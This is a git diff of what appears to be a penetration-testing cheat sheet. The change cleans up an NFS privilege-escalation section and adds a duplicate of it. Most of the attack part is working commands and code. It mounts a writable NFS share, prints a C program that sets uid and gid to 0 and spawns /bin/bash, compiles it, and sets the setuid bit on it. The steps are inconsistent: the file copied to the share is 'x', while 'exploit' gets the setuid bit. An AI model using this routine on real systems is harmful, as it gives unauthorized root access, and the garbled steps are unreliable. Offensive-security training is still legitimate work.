@@ -216,10 +216,10 @@ Exploit NFS shares for privesc:
 $ showmount -e 192.168.xx.53
 Export list for 192.168.xx.53:
 /shared 192.168.xx.0/255.255.255.0
-[root:~/Desktop]# mkdir /tmp/mymount
+$ mkdir /tmp/mymount
 /bin/mkdir: created directory '/tmp/mymount'
-[root:~/Desktop]# mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
-[root:~/Desktop]# cat /root/Desktop/exploit.c
+$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
+$ cat /root/Desktop/exploit.c
 #include <stdio.h>
 #include <unistd.h>
 int main(void)
@@ -229,8 +229,9 @@ setgid(0);
 system("/bin/bash");
 }
 gcc exploit.c -m32 -o exploit
-[root:/tmp/mymount]# cp /root/Desktop/x /tmp/mymount/
-[root:/tmp/mymount]# chmod u+s exploit
+
+$ cp /root/Desktop/x /tmp/mymount/
+$ chmod u+s exploit
 ```
 
 Attack scenario: replace target SSH keys with your own
@@ -669,7 +670,31 @@ Localhost listening ports:
 $ netstat -alntp
 ```
 
-/etc/fstab `cat /etc/fstab`:
+Exploit NFS shares for privesc (check `cat /etc/exports`):
+(/etc/exports is table of local physical file systems on an NFS server that are accessible to NFS clients)
+```bash
+$ showmount -e 192.168.xx.53                               # check for writable shares
+Export list for 192.168.xx.53:
+/shared 192.168.xx.0/255.255.255.0
+$ mkdir /tmp/mymount
+/bin/mkdir: created directory '/tmp/mymount'
+$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock # mount share
+$ cat /root/Desktop/exploit.c
+#include <stdio.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+gcc exploit.c -m32 -o exploit
+
+$ cp /root/Desktop/x /tmp/mymount/
+$ chmod u+s exploit
+```
+
+/etc/fstab  (check `cat /etc/fstab`):
 * Look for un-mounted file-systems
 * Look for file-systems with vulnerabilities e.g. ReiserFS privesc
 
